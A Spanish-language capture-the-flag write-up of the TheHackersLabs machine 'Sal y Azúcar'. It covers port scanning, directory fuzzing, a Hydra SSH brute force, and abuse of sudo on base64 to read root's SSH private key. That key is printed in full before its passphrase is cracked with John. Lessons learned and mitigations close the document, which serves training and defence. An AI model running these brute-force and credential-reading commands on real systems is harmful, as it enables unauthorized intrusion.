### Información General

|Campo|Detalle|
|---|---|
|Plataforma|TheHackersLabs|
|Máquina|Sal y Azúcar|
|IP|192.168.241.181|
|Dificultad|Fácil|
|Sistema Operativo|Linux (Debian)|
|Servicios|SSH (22), HTTP (80)|
|Vector inicial|Fuerza bruta SSH (Hydra)|
|Escalada de privilegios|`sudo` NOPASSWD sobre `/usr/bin/base64` → clave privada de root → crackeo con John|

### Resumen del Ataque

El reconocimiento inicial mostró únicamente dos puertos abiertos: SSH y HTTP con la página por defecto de Apache. Un directorio `/summary/` descubierto por fuerza bruta con Gobuster contenía un archivo `summary.html` con el mensaje "Cambia la contraseña", una pista directa hacia credenciales débiles. Efectivamente, un ataque de fuerza bruta con Hydra contra SSH usando diccionarios comunes reveló las credenciales `info:qwerty`. Una vez dentro como `info`, `sudo -l` mostró permiso NOPASSWD sobre `/usr/bin/base64`, que se usó para leer la clave privada SSH de root (`/root/.ssh/id_rsa`) sin necesidad de contraseña. La clave estaba protegida por passphrase, que se crackeó con John the Ripper y rockyou.txt, obteniendo acceso directo como root.

### Técnicas Usadas

- Escaneo de puertos con Nmap (`-p-`, `-sC -sV`)
- Fuzzing de directorios web con Gobuster
- Fuerza bruta de credenciales SSH con Hydra
- Abuso de binario permitido en `sudo -l` (GTFOBins: `base64`) para exfiltrar archivos con privilegios de root
- Crackeo de passphrase de clave SSH con `ssh2john` + John the Ripper (rockyou.txt)

### Desarrollo

**1. Escaneo de puertos completo**

```
sudo nmap -p- -sS --min-rate 5000 -n -vvv -Pn -oN ports 192.168.241.181
```

![](images/IMG-20260909130906161.png)

**2. Detección de versiones y scripts**

```
nmap -p 22,80 -sC -sV -oN allports 192.168.241.181
```

![](images/IMG-20260909130906329.png)

**3. Revisión web inicial**

```
http://192.168.241.181/
```

![](images/IMG-20260909130906501.png)

Página por defecto de Apache. Sin nada relevante en el código fuente.

**4. Fuzzing de directorios**

```
gobuster dir -u http://192.168.241.181 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html -t 125
```

![](images/IMG-20260909130906670.png)

**5. Acceso al directorio /summary/**

```
http://192.168.241.181/summary/
```

![](images/IMG-20260909130906829.png)

```
http://192.168.241.181/summary/summary.html
```

![](images/IMG-20260909130906967.png)

Pista clara de que las credenciales del sistema son débiles/por defecto.

**6. Fuerza bruta SSH**

```
hydra -t 64 -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt ssh://192.168.241.181
```

![](images/IMG-20260909130907138.png)

**7. Acceso SSH como info**

```
ssh info@192.168.241.181
```

```
info@salyazucar:/$ whoami
```

![](images/IMG-20260909130907288.png)

**8. Flag de usuario**

```
info@salyazucar:/var/www/html$ cd /home
info@salyazucar:/home$ cd info/
info@salyazucar:/home/info$ cat user.txt 
bdf8c3a56b3c61670c093a8bff406f6e
```

![](images/IMG-20260909130907445.png)

**9. Enumeración de usuarios con shell**

```
info@salyazucar:/home/info$ grep bash /etc/passwd
```

![](images/IMG-20260909130907588.png)

**10. Revisión de privilegios sudo**

```
info@salyazucar:/home/info$ sudo -l
````

![](images/IMG-20260909130907745.png)

**11. Abuso de sudo sobre base64 para exfiltrar la clave privada de root**

```
info@salyazucar:/home/info$ sudo /usr/bin/base64 "/root/.ssh/id_rsa" | base64 --decode
```

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
HdXsj9CjDt8KPdEd1WXLkwW34=
-----END OPENSSH PRIVATE KEY-----
```

**12. Crackeo de la passphrase de la clave**

```
chmod 600 id_rsa 
ssh2john id_rsa > hash.txt
```

```
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

![](images/IMG-20260909130907902.png)

**13. Acceso como root**

```
ssh -i id_rsa root@192.168.241.181
```

```
root@salyazucar:~# whoami
```

![](images/IMG-20260909130908078.png)

**14. Flag de root**

```
root@salyazucar:~# cat root.txt 
```

![](images/IMG-20260909130908239.png)

**15. Confirmación de flag de usuario desde root**

```
root@salyazucar:~# cd /home/info
root@salyazucar:/home/info# cat user.txt 
```

![](images/IMG-20260909130908394.png)

### Lecciones Aprendidas

- Un archivo aparentemente inofensivo ("Cambia la contraseña") puede ser en la práctica una confirmación de que las credenciales son débiles, guiando directamente hacia un ataque de fuerza bruta.
- Otorgar NOPASSWD sobre binarios de lectura genérica como `base64`, `cat`, `more`, etc. es equivalente a dar lectura arbitraria de archivos como root, incluyendo material sensible como claves privadas.
- Una clave SSH protegida por passphrase no es una defensa suficiente si la passphrase está en diccionarios comunes como rockyou.txt.

### Medidas de Mitigación

- Forzar políticas de contraseñas robustas y eliminar cuentas con contraseñas por defecto o triviales.
- Nunca otorgar `sudo NOPASSWD` sobre binarios genéricos de lectura de archivos (`base64`, `cat`, `less`, `more`, `cp`, etc.); si es imprescindible, restringir con rutas específicas y `Cmnd_Alias` bien definidos, o usar `sudoedit`.
- Retirar del servidor web cualquier archivo o directorio con listado habilitado que revele pistas sobre la configuración interna (`Options -Indexes`).
- Usar passphrases de alta entropía para claves SSH y no reutilizar contraseñas de sistema.
- Implementar `fail2ban` o similar para mitigar fuerza bruta contra SSH.



